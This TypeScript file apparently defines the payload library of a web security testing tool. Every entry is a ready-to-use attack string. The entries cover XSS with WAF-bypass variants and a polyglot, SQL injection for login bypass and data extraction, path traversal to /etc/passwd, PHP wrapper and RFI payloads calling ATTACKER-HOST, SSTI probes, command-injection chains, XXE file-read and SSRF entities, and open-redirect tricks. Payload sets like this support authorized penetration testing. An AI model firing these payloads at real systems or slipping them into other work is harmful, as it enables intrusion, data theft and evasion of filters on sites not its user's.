export interface Payload {
  id: string;
  label: string;
  value: string;
  note?: string;
}

export interface PayloadCategory {
  id: string;
  name: string;
  payloads: Payload[];
}

export const PAYLOAD_CATEGORIES: PayloadCategory[] = [
  {
    id: 'xss',
    name: 'XSS',
    payloads: [
      { id: 'xss-basic', label: 'Basic script', value: `<script>alert(1)</script>` },
      { id: 'xss-img', label: 'img onerror', value: `<img src=x onerror=alert(1)>` },
      { id: 'xss-svg', label: 'svg onload', value: `<svg onload=alert(1)>` },
      {
        id: 'xss-polyglot',
        label: 'Polyglot',
        value: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
        note: 'Fires in many different injection contexts at once.',
      },
      {
        id: 'xss-waf-case',
        label: 'WAF bypass - mixed case',
        value: `<ScRiPt>alert(1)</ScRiPt>`,
      },
      {
        id: 'xss-waf-double',
        label: 'WAF bypass - keyword doubling',
        value: `<img src=x oneonerrorrror=alert(1)>`,
        note: 'Defeats naive single-pass keyword stripping.',
      },
      {
        id: 'xss-waf-char',
        label: 'WAF bypass - fromCharCode',
        value: `<svg/onload=alert(String.fromCharCode(88,83,83))>`,
      },
    ],
  },
  {
    id: 'sqli',
    name: 'SQLi',
    payloads: [
      { id: 'sqli-authbypass', label: 'Auth bypass', value: `' OR '1'='1` },
      { id: 'sqli-authbypass2', label: 'Auth bypass - comment', value: `admin'--` },
      { id: 'sqli-union', label: 'UNION probe', value: `' UNION SELECT NULL,NULL,NULL--` },
      {
        id: 'sqli-error',
        label: 'Error-based (MySQL)',
        value: `' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
      },
      { id: 'sqli-boolean-true', label: 'Boolean-based (true)', value: `' AND 1=1--` },
      { id: 'sqli-boolean-false', label: 'Boolean-based (false)', value: `' AND 1=2--` },
      { id: 'sqli-time-mysql', label: 'Time-based (MySQL)', value: `' AND SLEEP(5)--` },
      { id: 'sqli-time-mssql', label: 'Time-based (MSSQL)', value: `'; WAITFOR DELAY '0:0:5'--` },
    ],
  },
  {
    id: 'lfi-rfi',
    name: 'LFI / RFI',
    payloads: [
      { id: 'lfi-basic', label: 'Path traversal', value: `../../../../etc/passwd` },
      { id: 'lfi-encoded', label: 'Path traversal - encoded dots', value: `....//....//....//etc/passwd` },
      {
        id: 'lfi-php-filter',
        label: 'PHP filter wrapper (source disclosure)',
        value: `php://filter/convert.base64-encode/resource=index.php`,
      },
      {
        id: 'lfi-data-wrapper',
        label: 'PHP data wrapper',
        value: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`,
        note: 'Decodes to <?php phpinfo(); ?> - for authorized RCE-chain testing only.',
      },
      { id: 'rfi-basic', label: 'RFI probe', value: `http://ATTACKER-HOST/test.txt?` },
    ],
  },
  {
    id: 'ssti',
    name: 'SSTI',
    payloads: [
      { id: 'ssti-jinja', label: 'Jinja2/Twig probe', value: `{{7*7}}` },
      { id: 'ssti-freemarker', label: 'FreeMarker probe', value: `${7*7}` },
      { id: 'ssti-erb', label: 'ERB probe', value: `<%= 7*7 %>` },
      { id: 'ssti-polyglot', label: 'Multi-engine polyglot probe', value: `\${{<%[%'"}}%\\.` },
      { id: 'ssti-jinja-config', label: 'Jinja2 config disclosure', value: `{{config}}` },
    ],
  },
  {
    id: 'cmdi',
    name: 'Command injection',
    payloads: [
      { id: 'cmdi-semicolon', label: 'Chain - semicolon', value: `; id` },
      { id: 'cmdi-pipe', label: 'Chain - pipe', value: `| id` },
      { id: 'cmdi-backtick', label: 'Substitution - backticks', value: '`id`' },
      { id: 'cmdi-dollar', label: 'Substitution - $()', value: `$(id)` },
      { id: 'cmdi-newline', label: 'Newline - encoded', value: `%0aid` },
    ],
  },
  {
    id: 'xxe',
    name: 'XXE',
    payloads: [
      {
        id: 'xxe-basic',
        label: 'External entity - file read',
        value: `<?xml version="1.0"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>`,
      },
      {
        id: 'xxe-ssrf',
        label: 'External entity - SSRF',
        value: `<?xml version="1.0"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://ATTACKER-HOST/">]>\n<data>&xxe;</data>`,
      },
    ],
  },
  {
    id: 'open-redirect',
    name: 'Open redirect',
    payloads: [
      { id: 'redir-param', label: 'Redirect param', value: `https://target.tld/redirect?url=https://evil.tld` },
      { id: 'redir-protocol-relative', label: 'Protocol-relative', value: `//evil.tld` },
      { id: 'redir-backslash', label: 'Backslash trick', value: `/\\evil.tld` },
      { id: 'redir-at', label: '@ trick', value: `https://target.tld@evil.tld` },
    ],
  },
];
